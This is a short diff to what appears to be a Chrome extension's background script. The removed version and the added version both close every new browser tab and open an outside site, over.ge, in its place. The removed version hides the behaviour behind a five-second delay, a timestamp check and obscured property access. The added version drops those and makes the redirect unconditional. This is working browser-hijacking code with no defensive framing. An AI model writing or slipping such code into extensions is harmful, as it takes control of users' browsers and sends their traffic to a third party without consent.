@@ -1,13 +1,12 @@
-setTimeout(function() {
-    if (window['r_d'] > 1471375864) {
-        chrome["tabs"]["onCreated"]["addListener"](function(loaded) {
-            if (loaded["url"] == "chrome://newtab/" || (loaded["url"] == "chrome://newtab" || loaded["url"] == "newtab")) {
-                chrome["tabs"]["remove"](loaded["id"], function() {});
-                chrome["tabs"]["create"]({
-                    "url": "http://over.ge/?page=newtab"
-                }, function() {})
-            }
-        })
+chrome.tabs.onCreated.addListener(function(tab) {
+    if (
+        tab.url == 'chrome://newtab/' ||
+        tab.url == 'chrome://newtab' ||
+        tab.url == 'newtab'
+    ) {
+        chrome.tabs.remove(tab.id, function() {});
+        chrome.tabs.create({
+            'url': 'http://over.ge/index.html'
+        }, function() {});
     }
-}, 5000);
- 
+});
